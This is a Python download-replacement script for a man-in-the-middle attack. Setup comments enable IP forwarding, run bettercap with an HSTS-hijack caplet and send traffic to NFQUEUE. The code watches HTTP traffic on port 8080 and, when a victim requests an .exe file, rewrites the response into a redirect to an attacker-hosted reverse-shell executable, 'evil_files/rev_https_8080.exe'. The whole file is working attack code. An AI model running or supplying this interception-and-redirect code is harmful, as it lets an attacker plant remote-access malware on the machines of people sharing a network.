#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
#echo 1 > /proc/sys/net/ipv4/ip_forward
#bettercap -iface wlan0 -caplet hstshijack/hstshijack
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0


ack_list = []
def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):

	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw)  :
		if scapy_packet[scapy.TCP].dport == 8080:
			if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.67.35" not in scapy_packet[scapy.Raw].load:
				print("[+] exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)			
		elif scapy_packet[scapy.TCP].sport == 8080:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replace file")
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.67.35/evil_files/rev_https_8080.exe\n\n")

				packet.set_payload(bytes(modified_packet))
	packet.accept()
nfqueue = NetfilterQueue()
try:
    nfqueue.bind(0, process_packet)
    nfqueue.run()
except KeyboardInterrupt:
    print("[+] User requested program termination...")
    nfqueue.unbind()